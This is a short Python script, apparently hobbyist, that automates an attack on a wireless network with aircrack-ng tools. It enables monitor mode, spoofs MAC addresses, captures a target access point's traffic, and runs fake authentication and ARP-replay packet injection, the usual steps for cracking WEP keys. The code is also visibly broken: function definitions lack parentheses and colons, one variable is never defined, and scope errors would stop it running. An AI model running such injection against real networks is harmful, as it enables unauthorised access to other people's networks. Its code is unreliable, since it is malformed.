
def init
	os.system("ifconfig wlan0 down")
	os.system("airmon-ng start wlan0")
	os.system("airmon-ng start wlan0")
	os.system("ifconfig mon0 down")
	os.system("ifconfig mon1 down")
	os.system("macchanger -r mon0")
	os.system("macchanger -r mon1")
	os.system("ifconfig wlan0 up")
	os.system("ifconfig mon0 up")
	os.system("ifconfig mon1 up")

def authme:
	os.system("aireplay-ng -1 0 -e "+essid+" -a "+bssid+" -h "+station+" mon0") 

def resume:
	#back to normal
	';'.join(("service network-manager start",
		"airmon-ng stop mon4",
		"airmon-ng stop mon3",
		"airmon-ng stop mon2",
		"airmon-ng stop mon1",
		"airmon-ng stop mon0",
		"airmon-ng stop wlan0"))
	os.system(cmdlist)
# -------------------------------------------------


def clrpcrap:
	os.system("service network-manager stop")
	os.system("airmon-ng stop mon4")
	os.system("airmon-ng stop mon3")
	os.system("airmon-ng stop mon2")
	os.system("airmon-ng stop mon1")
	os.system("airmon-ng stop mon0")
	os.system("airmon-ng stop wlan0")

def scan
	os.system("airodump-ng mon1")
	bssid = raw_input("bssid: ")
	essid = raw_input("essid: ")
	c = raw_input("channel: ")
	o = os.popen("macchanger -s mon0")
	station = o.read()[13:30]
	os.system("xterm -e airodump-ng -c "+c+" --bssid "+bssid+" -w "+essid+" mon1 &")

# fake auth
cunt = "n"
while (cunt == "n"):
	cunt = raw_input("Success(y/n):")

#de-auth the fake auth
os.system("xterm -e aireplay-ng -3 -b "+bssid+" -h "+station+" mon0 &")

